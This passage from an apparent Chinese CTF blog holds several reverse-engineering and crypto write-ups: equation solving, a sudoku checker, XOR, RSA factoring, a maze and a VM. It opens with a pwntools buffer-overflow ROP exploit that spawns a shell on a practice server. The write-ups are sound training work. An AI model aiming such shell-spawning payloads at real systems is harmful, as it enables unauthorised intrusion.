elf.plt[&apos;system&apos;] sh_addr = next(elf.search(&quot;/bin/sh&quot;)) payload = &apos;a&apos; * 0x88 payload += p64(pop_rdi_ret_addr) payload += p64(sh_addr) payload += p64(system_plt) p.send(payload) p.interactive() 或者直接找地址： from pwn import * p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) sh_addr=0x600a90 sys_addr=0x4004c0 popret=0x00000000004006b3 payload=&apos;a&apos;*0x88 + p64(popret) + p64(sh_addr) + p64(sys_addr) p.send(payload) p.interactive() CTF{081ecc7c8d658409eb43358dcc1cf446} 另外发现网上有些wp尝试在payload上加p64(1),后来发现此题不用加，若加必须加在最后一位才可，倒数第二位就不可。 疑问： 怎么区分加与不加(与上一题比较)？ 五、[XMAN]level3下载链接题目描述： nc pwn2.jarvisoj.com 9879","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://leo.dropsec.xyz/tags/PWN/"}]},{"title":"iscc2018 My math is bad","slug":"iscc2018-My-math-is-bad","date":"2018-05-06T02:41:55.000Z","updated":"2018-07-30T13:55:59.248Z","comments":true,"path":"2018/05/06/iscc2018-My-math-is-bad/","link":"","permalink":"http://leo.dropsec.xyz/2018/05/06/iscc2018-My-math-is-bad/","excerpt":"在同伴看来很简单的一道题，到我这里却折腾了2、3天，才算勉强顺我的意。字符串s分段利用的理解、计算v1等8个数据的值，以及逆算flag这几个地方是我受阻的点。","text":"在同伴看来很简单的一道题，到我这里却折腾了2、3天，才算勉强顺我的意。字符串s分段利用的理解、计算v1等8个数据的值，以及逆算flag这几个地方是我受阻的点。下载链接根据题目hint可知，本题可能会关系到数学计算。将下载得到的elf直接拉到ida查看关键伪代码：先查看函数sub_400766()，需要返回1输入的s长32，!=当作==看待才能使函数返回1再看一下函数sub_400B16()显示是在输出flag。想得到flag必须首先求出s (这道题到Linux下运行输入正确s就会得到flag，我原本准备求出s后，再根据这个函数操作写个脚本得到flag，以为操作很简单，就是一个异或和求余，然后忽略了一些细节导致得不到flag) 回到第一个函数先求S,显然是先解一组四元一次方程(为方便查看将第一个if里的参数一次重命名为a,s,b,c)： a * s - b * C == 2652042832920173142 3 * c + 4 * b - a -2 * s == 397958918 3 * s * b - c * a == 3345692380376715070 27 * a + s -11 * b - c == 40179413815 由于对数组在ida伪代码里的存在形式理解的不够全面，刚开始我没有想到把其他参数a,b,c和s联系理解，其实a,b,c包括后面分析到的v3,v4,v5,v6都是数组s的一部分，这可以通过观察参数名和双击进去查看对应.bss数据段看到，dword_6020A4、dword_6020A8、dword_6020AC、unk_6020B0、unk_6020B4、unk_6020B8、unk_6020BC都是数组s的一部分，并且重组s的时候要注意各个部分的顺序。 现在我们知道了，要想求出s，需要求出以上8个参数。很自然的过度到了下一个方程组，其中v3,v4,v5,v6是我们要求的，然而解出它们需要知道v1,v2,v7…v12的值，进而需要知道种子srand()的参数，用到了第一个方程组的解，那就先求第一个方程组吧。在这里用在线解方程https://zh.numberempire.com/equationsolver.php先转化成符合要求的形式： a*s-b*c=2652042832920173142,3*c+4*b-a-2*s=397958918,3*s*b-c*a=3345692380376715070,27*a+s-11*b-c=40179413815 然后解出： a = 1801073242,s = 1869639009,b = 862734414,c = 829124174 然后编写c脚本求v1,v2,v7…v12的值，如下：然后我兴高采烈的拿着得到的8个值去解第二个方程了，然后在线解得到的是分数，懵逼了。后来经过小伙伴提醒，相同的C代码在Windows、Linux下运行得到的结果可能会不同，而这个程序本来就是Linux下的程序，遂复制到Linux下运行果然。于是 v1 = 22,v2 = 39,v7 = 45,v8 = 45,v9 = 35,v10 = 41,v11 = 13,v12 = 36 然后得到第二个方程组： v6 * 39 + v3 * 22 - v4 - v5 == 61799700179 v6 + v3 + v5 * 45 - v4 * 45 == 48753725643 v3 * 35 + v4 * 41 - v5 -v6 == 59322698861 v5 * 36 + v3 - v4 - v6 * 13 == 51664230587 转化形式： v6*39+v3*22-v4-v5=61799700179,v6+v3+v5*45-v4*45=48753725643,v3*35+v4*41-v5-v6=59322698861,v5*36+v3-v4-v6*13=51664230587 解出： v3=811816014,v4=828593230,v5=1867395930,v6=1195788129 然后调整参数顺序(s: s a c b v3 v4 v5 v6)，注意是int型拿取数据，然后得到s: s: ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG (上面这个脚本倒取数据的时候有点费事，文末附一个简单的脚本) 然后Linux下运行程序，输入s,得到flag： flag： flag{th3_Line@r_4lgebra_1s_d1fficult!} 补充一、 求v1,v2,v7…v12的值的时候除了写脚本还有一个简单快捷方法，就是结合ida与gdb跟出来。需要在gdb中下个断点，下载哪里好呢?v12赋完值后，开始比较，那就在第一个跳转那下断吧第一个箭头处是v12赋值，设断在第一个jnz处，地址400A69，然后需要输入s,需要注意的是执行到赋值这里的前提是第一组方程解出来的部分参数要求输入正确，也就是s的前16位需要输入正确，这里输入：ampoZ2ZkNnk1NHl31111111111111111，然后断下观察ida变量定义处变量是连续的，查看内存地址rsp+0x20往后100个内存单元的内容，应该会找到v1,v2,v7…v12的值，并且因为种子是固定的，所以它们的值是不变的。 0x16,0x27,0x2d,0x2d,0x23,0x29,0xd,0x24 即 22,39,45,45,35,41,13,36 二、 补一下逆求flag的脚本： 注意数据字节大小的转化，还有s数组之后还有一些未知数据，一般情况下是0，四个四个取数据，到最后需要用0补够四个。 #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int main() { int v0,i; char ss[60]; char b[60]; int a[] = {39,236,19,1,7,6,52,195,72,199,223,177,159,219,25,45,4,241,145,10,162,210,21,213,237,53,144,220,212,60,63,244}; char s[] = {97,109,112,111,90,50,90,107,78,110,107,49,78,72,108,51,78,84,99,48,78,84,99,49,90,51,78,111,97,71,70,71,0,0,0,0,0}; printf(&quot;%s&quot;,&quot;flag{&quot;); for ( i = 0; i &lt; 32; ++i ) { srand(*(int*)(&amp;s[i])); //重点，刚开始被我忽略了 v0 = rand(); b[i] = (0xff &amp; a[i]) ^ v0 % 255; printf(&quot;%c&quot;,b[i]); } printf(&quot;%s&quot;,&quot;}&quot;); return 0; } 运行结果： flag{th3_Line@r_4lgebra_1s_d1fficult!} 总结 灵活、充分理解数组在ida伪代码中的存在形式。 明确C代码在Windows与Linux下的区别。 伪代码小细节(数据存储大小变化…)不能忽略。 观察、动手相结合，即ida与gdb相结合。 附上文小脚本: rehex #功能样例(python 2.7)： #输入：0x6f706d61 0x6b5a325a #输出：0x61,0x6d,0x70,0x6f,0x5a,0x32,0x5a,0x6b #by: @pq 2018/05/06 def get(txt): txt_ = txt.replace(&apos;0x&apos;,&apos;&apos;) x = txt_[0::2] y = txt_[1::2] l = [] for i,j in zip(x,y): l.append(&apos;0x&apos;+i+j) l.reverse() return l if __name__ == &apos;__main__&apos;: l = input(&apos;请输入待转化数据，格式：0xaaaaaaaa 0xaaaaaaaa ...\\n&apos;) s = l.split(&apos; &apos;) #print s the_list = [] for n in s: for m in get(n): the_list.append(m) print (&apos;,&apos;.join(the_list))","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"ciscn2017 填数游戏","slug":"ciscn2017-填数游戏","date":"2018-04-30T07:32:21.000Z","updated":"2018-07-30T13:55:31.939Z","comments":true,"path":"2018/04/30/ciscn2017-填数游戏/","link":"","permalink":"http://leo.dropsec.xyz/2018/04/30/ciscn2017-填数游戏/","excerpt":"前昨天跟着”打”了ciscn2018,结果根本看不进去题目。我也不知道我怎么了… 数独游戏规则：数独盘面是个九宫，每一宫又分为九个小格。在这八十一格中给出一定的已知数字和解题条件，利用逻辑和推理，在其他的空格上填入1-9的数字。使1-9每个数字在每一行、每一列和每一宫中都只出现一次，所以又称“九宫格”。","text":"前昨天跟着”打”了ciscn2018,结果根本看不进去题目。我也不知道我怎么了… 数独游戏规则：数独盘面是个九宫，每一宫又分为九个小格。在这八十一格中给出一定的已知数字和解题条件，利用逻辑和推理，在其他的空格上填入1-9的数字。使1-9每个数字在每一行、每一列和每一宫中都只出现一次，所以又称“九宫格”。下载链接一个exe，输入后没有提示一闪而过。简单看看什么语言写的便于选择对应分析工具。拉进ida，根据关键字符找到关键伪代码：根据’success’溯源，发现几个关键函数：sudu() set_data() set_sudu() check() 正确的控制函数的返回值便可输出success 依次分析： void *__fastcall Sudu::Sudu(void *a1) { return memset(a1, 0, 0x144u); //给数组a1分配324个字节 可存储81个char } int __userpurge Sudu::set_data@&lt;eax&gt;(int a1@&lt;ecx&gt;, Sudu *this, int (*a3)[9]) { int result; // eax signed int j; // [esp+Ch] [ebp-Ch] signed int i; // [esp+10h] [ebp-8h] for ( i = 0; i &lt;= 8; ++i ) { for ( j = 0; j &lt;= 8; ++j ) { result = j + 9 * i; *(_DWORD *)(a1 + 4 * result) = *((_DWORD *)this + 9 * i + j); } //将this数组中的字符存储到数组a1中 以9X9矩阵的形式 } return result; } this数组即data_start数组：也是81个字符 signed int __cdecl set_sudu(Sudu *a1, const std::string *a2) //返回值需为1 { std::string *v2; // ST00_4 std::string *v4; // [esp+0h] [ebp-38h] int v5; // [esp+Ch] [ebp-2Ch] int v6; // [esp+1Ch] [ebp-1Ch] int v7; // [esp+20h] [ebp-18h] char v8; // [esp+27h] [ebp-11h] const std::string *v9; // [esp+28h] [ebp-10h] int v10; // [esp+2Ch] [ebp-Ch] v10 = 0; v9 = a2; v7 = std::string::begin(v4); v6 = std::string::end(v2); while ( (unsigned __int8)__gnu_cxx::operator!=&lt;char const*,std::string&gt;(&amp;v7, &amp;v6) ) { v8 = *(_BYTE *)__gnu_cxx::__normal_iterator&lt;char const*,std::string&gt;::operator*(&amp;v7); if ( (unsigned __int8)Sudu::set_number((int)a1, (Sudu *)(v10 / 9), v10 % 9, v8 - 48, v5) ^ 1 ) //关键函数 set_number() 返回值需为1 return 0; ++v10; __gnu_cxx::__normal_iterator&lt;char const*,std::string&gt;::operator++(&amp;v7); } return 1; } signed int __userpurge Sudu::set_number@&lt;eax&gt;(int a1@&lt;ecx&gt;, Sudu *this, int a3, int a4, int a5) { if ( !a4 ) //输入的字符 return 1; if ( (signed int)this &lt; 0 || (signed int)this &gt; 8 || a3 &lt; 0 || a3 &gt; 8 || *(_DWORD *)(a1 + 4 * (a3 + 9 * (_DWORD)this)) //判断a1数组中元素是否为0 不为0则直接输出false 所以数组中原先有值的地方必须输入0 || a4 &lt;= 0 || a4 &gt; 9 ) { return 0; } *(_DWORD *)(a1 + 4 * (9 * (_DWORD)this + a3)) = a4; //不满足if条件则将输入的保存到a1 return 1; } bool __fastcall Sudu::check(Sudu *a1) //对9个小九宫格、每行、每列依次检查是否满足有1-9 { Sudu *v2; // [esp+0h] [ebp-4h] v2 = a1; return (unsigned __int8)Sudu::check_block((int)a1) //块 &amp;&amp; (unsigned __int8)Sudu::check_col((int)v2) //列 &amp;&amp; (unsigned __int8)Sudu::check_row((int)v2); //行 } 检查的办法如下： signed int __fastcall Sudu::check_block(int a1) { char v2[10]; // [esp+12h] [ebp-26h] int v3; // [esp+1Ch] [ebp-1Ch] int v4; // [esp+20h] [ebp-18h] int l; // [esp+24h] [ebp-14h] int k; // [esp+28h] [ebp-10h] int j; // [esp+2Ch] [ebp-Ch] int i; // [esp+30h] [ebp-8h] for ( i = 0; i &lt;= 8; ++i ) { for ( j = 1; j &lt;= 9; ++j ) v2[j] = 1; for ( k = 0; k &lt;= 8; ++k ) { v4 = 3 * (i / 3) + k / 3; //块独有 v3 = 3 * (i % 3) + k % 3; v2[*(_DWORD *)(a1 + 4 * (v3 + 9 * v4))] = 0; } for ( l = 1; l &lt;= 9; ++l ) { if ( v2[l] ) return 0; } } return 1; } 先生成一个元素均为1的数组v2然后依次去访问v2中是第a1个元素 并赋值0 假如每行1-9都有的话 最后v2的每个元素都会变为0 然后函数返回1 输出success! 大致了解了思路后就去解数独吧。有2种比较快的方法：一：在线解数独： http://shudu.gwalker.cn/ 二：跑程序。随便网上copy个解数独的小程序 如HDU 1426 Sudoku Killer代码将0改写为？符合格式? ? 7 5 ? ? ? 6 ?? 2 ? ? 1 ? ? ? 79 ? ? ? 3 ? 4 ? ?2 ? 1 ? ? ? ? ? ?? 3 ? 1 ? ? ? ? 5? ? ? ? ? ? 7 1 ?4 ? ? ? ? 8 2 ? ?? ? 5 9 ? ? ? 8 ?? 8 ? ? ? 1 ? ? 3然后运行 最后把原先有数据的地方改为0，加上格式就是flag了。flag{340089102508406930016207058060875349709064820854392006093650071170023604602740590} 有个疑问：就是有数据地方赋0会不会影响最后的check，输入flag后，有值的地方变为了0，会不会影响check 1-9.答：没有分析透set_number()这个函数。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"安恒3月月赛 Re","slug":"安恒3月月赛-Re","date":"2018-03-29T10:40:22.000Z","updated":"2018-07-30T13:54:23.274Z","comments":true,"path":"2018/03/29/安恒3月月赛-Re/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/29/安恒3月月赛-Re/","excerpt":"自己真的太菜了，什么也不想说了。 python[::-1] + RSA","text":"自己真的太菜了，什么也不想说了。 python[::-1] + RSA 一、xor下载链接用die或peid查不出xor的编写语言，斯托夫分析出的格式为Mach-o,在osx下可执行。拉进IDA看看，容易找到关键伪码思路也是比较清晰的，输入的flag长度为33，经过有规律的异或操作后讲结果与global处的字符串进行对比。点进去看看global是什么右键、data,变成直观的数组形式可见，有些元素是不可见字符选中这些数据，然后Shift+e将数据以方便写脚本的形式提取出来注意不要多取后面的0，也不要少取。然后就是写脚本了，这个脚本相对来说稍微不好写一点，注意逆序操作和添补第一个字符，如下： g = [0x66,0x0A,0x6B,0x0C,0x77,0x26,0x4F,0x2E,0x40,0x11,0x78,0x0D,0x5A,0x3B,0x55,0x11,0x70,0x19,0x46,0x1F,0x76,0x22,0x4D,0x23,0x44,0x0E,0x67,0x06,0x68,0x0F,0x47,0x32,0x4F] length = len(g) ret = &quot;&quot; for i in range(1,length)[::-1]: ret += chr(g[i]^g[i-1]) #逆序操作 print (chr(g[0]) + ret[::-1]) 运行结果：flag{QianQiuWanDai_YiTongJiangHu} 我当时做的时候，由于不知道怎么方便的处理global数组的数据，所以没有继续做下去，积累经验喽。还有，学会熟练的使用[::-1]这个利器。 二、RSA下载链接刚开始着手做RSA类型的题目，因为没有配好专门解这类题目的环境，在这里更多的是利用工具来解。先简单阐述下RSA密钥体制。 RSA算法涉及三个参数 N，e，d其中N是两个大素数p，q的乘积，即模数N = p q计算φ = (p−1) (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质取e的模反数为d，计算方法: e * d ≡ 1 (mod φ)对明文m进行加密：c = pow(m, e, N)，得到的c即为密文对密文c进行解密，m = pow(c, d, N)，得到的m即为明文一般称（N，e)为公钥 （N，d)为私钥 参数整理：p 和 q ：大整数N的两个因子（factor）N：大整数N，我们称之为模数（modulus)e 和 d：互为模反数的两个指数（exponent）c：密文 m：明文，这里一般指的是一个十进制的数 CTF中的RSA题目一般是将flag进行加密，然后把密文（即c）和其他一些你解题需要的信息一起给你，你需要克服重重难关，去解密密文c，得到flag（即m），题型有很多种，这里写的是最常见的：出题人会给你一个公钥文件（通常是以.pem或.pub结尾的文件）和密文（通常叫做flag.enc之类的），你需要分析公钥，提取出（N，e），通过各种攻击手段恢复私钥，然后去解密密文得到flag。 所以这里介绍的方法可能不会适用于任何解密RSA的场合。 打开文件flag.enc里面是密文pub.key是公钥文件这里用 在线Rsa公私钥解析网站 http://tool.chacuo.net/cryptrsakeyparse解析出模数N和指数eN: C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDe: 65537然后用 大数分解网站factordb http://factordb.com/ 分解N发现直接分解十六进制的N不成功，先把N转换成十进制N: 86934482296048119190666062003494800588905656017203025617216654058378322103517分解成功p: 285960468890451637935629440372639283459q: 304008741604601924494328155975272418463现在可以根据pq计算出d,这里利用一个小工具RSAtoold: 81176168860169991027846870170527607562179635470395365333547868786951080991441 到现在就可以用公式 m = c^d mod N 解出明文了 python2.7脚本： # m = open(&apos;E:\\\\flag.enc&apos;).read().encode(&apos;hex&apos;) # print m 4196c0594a5e000a96b878b67cd724795b13a8f2ca54da06d0f19c28be689b62 mm = 0x4196c0594a5e000a96b878b67cd724795b13a8f2ca54da06d0f19c28be689b62 d = 81176168860169991027846870170527607562179635470395365333547868786951080991441 n = 86934482296048119190666062003494800588905656017203025617216654058378322103517 c = pow(mm,d,n) # print c 4618144028027957675862906963888332345633248954043303780331531906089123082 # print hex(c) 0x29d207b7a521e08e4e6180600666c61677b646563727970745f3235367d0aL print (&apos;0&apos;+hex(c)[2:][:-1]).decode(&quot;hex&quot;) 运行结果： \u0002� {zR��\u0018\u0006 flag{decrypt_256} 如果遇到明文是一串数字的情况，也可以用小工具 Big Integer Calculator 来计算明文 然后flag就是flag{decrypt_256}了。 总结一下：解密RSA，要紧紧围绕e、d、N等关键参数与加密公式c = pow(m, e, N)和解密公式m = pow(c, d, N)进行。官方wp链接 http://forum.91ctf.com/index.php/group/topic/id-51 目前我还没搞好他的运行环境~~~初出茅庐，介绍RSA不够系统全面，贴几个详细介绍链接:CTF中RSA的常见攻击方法 https://www.anquanke.com/post/id/84632CTF中RSA题型解题思路及技巧 http://www.freebuf.com/articles/others-articles/161475.html","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"Just_Three","slug":"Just-Three","date":"2018-03-28T13:43:37.000Z","updated":"2018-07-30T13:53:43.648Z","comments":true,"path":"2018/03/28/Just-Three/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/28/Just-Three/","excerpt":"前三周学习总结 + 第四周分享会简单记录","text":"前三周学习总结 + 第四周分享会简单记录做好任何一件事情都不容易，哪怕是一件很微小的事情。前三周断断续续的做了几道南邮上的题目，看着大佬的wp断断续续的更了几篇博客。但是我感觉自己并没有完全掌握解题所需的技能，更没有完全独立做出题的能力。还是需要多多练习、多多总结、多多联系。为了能使所学知识连贯起来，也方便别人和自己日后回顾，继续上学期的周汇总。 一、实验吧：该题不简单下载链接 无论题目标识难或易，通过率能暴漏一切。题目说让我们找到”hello”用户名对应的注册码。这个hint暗示我们正确的flag是事先根据hello生成好的，我们可以直接去Od里面找到正确的flag。这对于算法复杂的题目来说是种好方法。然而这道题目算法很清晰。拉进IDA，可以根据错误提示“密钥无效！”运用Alt+T快捷键搜索到关键位置(有些IDA版本可能会搜不到，但是列表左侧第一个函数就是关键函数，也很容易找到)算法很清晰，但是里面有几个不熟悉的函数，搞懂函数功能后容易根据葫芦画瓢用python写出脚本。 int GetDlgItemText( HWND hDlg , int nID, LPTSTR lpStr, int nMaxCount) nID 指定了要获取其标题的控件的整数标识符 lpStr 指向要接收控件的标题或文本的缓冲区 nMaxCount 指定了要拷贝到lpStr的字符串的最大长度（以字节为单位）。如果字符串比nMaxCount要长，它将被截断 lstrcat(String1, String2) 该函数将字符串String2加在另一个字符串String1后面 lstrcmp(String1,String2) lstrcmp 字符串比较，区分大小写; lstrcmpi 不区分大小写. 返回值: -1、0、1, 其中 0 表示相同 然后就是py脚本： string = &quot;hello&quot; string2 = &quot;&quot; for i in range(len(string)): string2 += chr((i + i *ord(string[i])*ord(string[i])) % 0x42 + 33) string = &quot;Happy@&quot; + string2 print(string) 运行结果： Happy@!GA0U 二、易语言报毒的了解下载链接之前遇到过这道题目，当时没思路后直接看了别人的wp，然后的然后就缺失了自己的思考。现在再次遇到这个题目，简单总结下新了解的东西。提示说输入的密码是一个纯数字，1000具有特殊含义。对于像我这样缺少经验又记忆力不好的同学来说能意会到”特殊含义”貌似不太容易。可是对于我们搞二进制的，需要对01时刻保持高度的敏感呀！然后你就应该知道1000表示的是8，这就是特殊含义喽~输入8，确定，安全软件提示在C盘生成危险文件，文件里的便是”伪flag”，对于喜欢裸奔的同学来说，怎么知道会生成文件，怎么知道flag呢？ 呃，我也不知道~ 接下来补充下关于易语言报毒的内容：明明是易语言写的小程序，die与peid偏偏说是C/C++ emmm…下面是百度百科对易语言报毒的说明： 语言缺点由于易语言程序的运行方式存在特殊性，单个空白程序就达到400~500KB，当前易语言拓展插件：斩月，黑月的一些模块可以把易语言编译的程序缩小，缩小后的空白程序仅为10Kb左右。易语言编写的程序被许多杀毒软件的高级启发式技术误报为病毒，甚至一个不包含任何代码的空白程序都会被一些杀毒软件识别为木马。有关各方都在积极解决这个问题，但是截止2017年12月，误报问题仍然存在。 运行报错关于易语言误报问题，实践证明：并非易语言生成出来的程序容易误报，VB单独生成的空窗口也报毒，C++也同样出现误报现象。当然，也有一些不正当利用易语言编写的程序例如：盗号，木马，键盘监控的程序，然后寻求解除误报的方法，这样是没用的，程序本身就存在危害，报毒也属于正常现象。因此，若用户需要检验由易语言编写的成品是否有毒，可到网络软件分析处检查，可得到更详细的分析，且对一般无毒程序不会报毒，但过程缓慢。 报毒说明因为它的行为有点像病毒：弹出窗口，修改注册表，写出文件，隐藏窗口等等，所以国内许多知名的杀毒软件都会报毒。一般情况下，程序不修改注册表，增加花指令，修改版本号，通过第三方软件进行加壳，可在一定程度上避免杀软误报。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"DefCamp","slug":"DefCamp","date":"2018-03-24T11:40:50.000Z","updated":"2018-07-30T13:52:44.563Z","comments":true,"path":"2018/03/24/DefCamp/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/24/DefCamp/","excerpt":"细思极恐、巩固基础。","text":"细思极恐、巩固基础。下载链接西普公开课上的一道例题、同时也是2017世安杯、实验吧上的题目。 题目不难，直接看ida反汇编代码基本可以解决，但是在看完西普老师讲解后，发下有很多细节平常自己都没注意，有日后温习的价值。 直播链接(视频的后半部分) http://zzti.shiyanbar.com/course/81912/vid/2233 简单贴一下这道题的总结： 这是刚学到的，虽然不影响IDA直接分析，但是会影响GDB动态执行，之后可能会碰到这种情况。解决办法就是找到其对应的汇编代码，9090(NOP)掉、保存。这是NOP之前的伪代码NOP之后的伪代码，少了一个死循环。 解题关键L: 反调试 初始化链表 循环查找链表 比较","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"maze","slug":"maze","date":"2018-03-21T03:24:07.000Z","updated":"2018-07-30T13:52:27.814Z","comments":true,"path":"2018/03/21/maze/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/21/maze/","excerpt":"让我们干了这杯maze酒！","text":"让我们干了这杯maze酒！maze是CTF中常见的题目类型，本打算多做几道类似题目然后梳理总结下的，但是自己太菜了，暂且先记下这个吧。 这道题也是南邮上的。下载链接 下载下来是Linux文件，没有hint，无壳，拉进IDA，容易找到关键伪代码 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { const char *v3; // rsi signed __int64 v4; // rbx signed int v5; // eax char v6; // bp char v7; // al const char *v8; // rdi __int64 v10; // [rsp+0h] [rbp-28h] v10 = 0LL; puts(&quot;Input flag:&quot;); scanf(&quot;%s&quot;, &amp;s1, 0LL); if ( strlen(&amp;s1) != 24 || (v3 = &quot;nctf{&quot;, strncmp(&amp;s1, &quot;nctf{&quot;, 5uLL)) || *(&amp;byte_6010BF + 24) != 125 ) { LABEL_22: puts(&quot;Wrong flag!&quot;); exit(-1); } v4 = 5LL; if ( strlen(&amp;s1) - 1 &gt; 5 ) { while ( 1 ) { v5 = *(&amp;s1 + v4); v6 = 0; if ( v5 &gt; 78 ) { v5 = (unsigned __int8)v5; if ( (unsigned __int8)v5 == 79 ) { v7 = sub_400650((char *)&amp;v10 + 4, v3); goto LABEL_14; } if ( v5 == 111 ) { v7 = sub_400660((char *)&amp;v10 + 4, v3); goto LABEL_14; } } else { v5 = (unsigned __int8)v5; if ( (unsigned __int8)v5 == 46 ) { v7 = sub_400670(&amp;v10, v3); goto LABEL_14; } if ( v5 == 48 ) { v7 = sub_400680(&amp;v10, v3); LABEL_14: v6 = v7; goto LABEL_15; } } LABEL_15: v3 = (const char *)HIDWORD(v10); if ( !(unsigned __int8)sub_400690(asc_601060, HIDWORD(v10), (unsigned int)v10) ) goto LABEL_22; if ( ++v4 &gt;= strlen(&amp;s1) - 1 ) { if ( v6 ) break; LABEL_20: v8 = &quot;Wrong flag!&quot;; goto LABEL_21; } } } if ( asc_601060[8 * (signed int)v10 + SHIDWORD(v10)] != 35 ) goto LABEL_20; v8 = &quot;Congratulations!&quot;; LABEL_21: puts(v8); return 0LL; } 一段一段分析 if ( strlen(&amp;s1) != 24 || (v3 = &quot;nctf{&quot;, strncmp(&amp;s1, &quot;nctf{&quot;, 5uLL)) || *(&amp;byte_6010BF + 24) != 125 ) 可知字符串长度为24，前5个字符是nctf{,最后一个字符是}，即flag格式为nctf{ } 接下来的是4个方向的移动，这里分析第一个 v3 = 5LL; while ( 1 ) //多次循环执行 { v4 = *(&amp;s1 + v3); //从输入字符串的下标为5的字符开始 v5 = 0; if ( v4 &gt; 78 ) { v4 = (unsigned __int8)v4; if ( (unsigned __int8)v4 == 79 ) //79-&gt;&apos;O&apos; 如果当前字符为O则执行下面代码 { v6 = sub_400650((_DWORD *)&amp;v9 + 1); //进入sub_400650()函数 goto LABEL_14; //跳到LABEL_14继续执行 } ... } sub_400650()函数如下： bool __fastcall sub_400650(_DWORD *a1) { int v1; // eax v1 = (*a1)--; //(*a1)的值减一，即(&amp;v9+1)的值减一 return v1 &gt; 0; } LABEL_14: v5 = v6; goto LABEL_15; LABEL_15: if ( !(unsigned __int8)sub_400690((__int64)asc_601060, SHIDWORD(v9), v9) ) goto LABEL_22; //输出“wromg~&quot; if ( ++v3 &gt;= strlen(&amp;s1) - 1 ) //满足条件，则循环结束 { if ( v5 ) break; SHIDWORD()的作用是取下一字节asc_601060处存储的数据为：’ * ** * * # ** *‘ 函数sub_400690(): __int64 __fastcall sub_400690(__int64 a1, int a2, int a3) { __int64 result; // rax result = *(unsigned __int8 *)(a1 + a2 + 8LL * a3); //因为8*a3,所以v9代表列,v9+1代表行。同时可知每行有8个字符 LOBYTE(result) = (_DWORD)result == &apos; &apos; || (_DWORD)result == &apos;#&apos;; //判断此步是否可走 return result; } 关键之一是找出谁代表行、列，然后就可以将四种符号与左右上下移动联系起来 再继续看跳出循环之后的代码 if ( asc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != 35 ) //35对应‘#’ goto LABEL_20; v7 = &quot;Congratulations!&quot;; 多次循环执行结束之后，如果坐标处为’#” 则输出Congratulations! 否则goto LABEL_20，输出wrong~ 现在已经知道v9处代表列，v9+1处代表行，结合移动的函数可以知道：O-&gt;左移 o-&gt;右移 .-&gt;下移 0-&gt;上移 现在知道了maze的终点是‘#’和移动规则，只差关键二找起点了。找到定义v9与v9+1的地方看有没有初始值再看看对应的汇编代码可知行和列初始值都为0 结合每行8个字符，现在可将矩阵画出来,用@代表空格 然后从(0,0)开始走，Oo.0 代表 左右下上 的移动 终点是# 空格代表通路可走然后喝完这杯maze酒得到的精华就是 o0oo00O000oooo..OO即nctf{o0oo00O000oooo..OO} 总结：走出迷宫的要领： 分清行与列的代号 明确起终点 明确移动规则","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"WxyVM","slug":"WxyVM","date":"2018-03-17T06:04:24.000Z","updated":"2018-07-30T13:51:58.012Z","comments":true,"path":"2018/03/17/WxyVM/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/17/WxyVM/","excerpt":"南邮平台上的两道题。开始近距离接触IDC/IDAPython。","text":"南邮平台上的两道题。开始近距离接触IDC/IDAPython。 WxyVM下载链接本题没有hint,按照习惯来，好习惯是很重要的。格式分析后发现是ELF文件。 加载到IDA里看看，容易找到关键算法的伪码思路比较简单，输入的字符串经过sub_4005B6()的处理然后与dword_601060处存储的数据进行比较，相同则Correct。字符串长度为24.先查看一下dword_601060处的数据看起来比较奇葩，存储的数据不止24个，肯定有其他操作。(有一个重要的点是最后对比的数组，是一个char类型的，所以我们取数据的时候每4位取最低位，而不是直接取)先看看sub_4005B6()是干什么的吧 __int64 sub_4005B6() { unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) { v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) { case 1u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]); break; default: continue; } } return result; } byte_6010C0是一个长度为15000的数组，每3个分为一组，v0,v1,v2，一共5000组。v0用来 switch哪种运算处理，v2用来指定相对于buffer的偏移量，v3用以参与计算。 所以代码到这就很明显了，从dword_601060处逆操作还原出byte_604B80即可，只不过写脚本不怎么顺心啊，代码里有两个坑： 从dword_601060处取数据时需要每4位只保留最低位。 会溢出。 网上搜索题解看到有大佬用IDC脚本进行操作，脚本如下： auto i; for ( i = 14997; i &gt;= 0; i = i - 3 ) { auto v0 = Byte(0x6010C0+i); auto v3 = Byte(0x6010C0+(i + 2)); auto result = v0; if(v0==1){ result =Byte(0x6010C0+i + 1); PatchByte(0x601060 + result*4,Byte(0x601060 + result*4)-v3); } if(v0==2){ result =Byte(0x6010C0+i + 1); PatchByte(0x601060 + 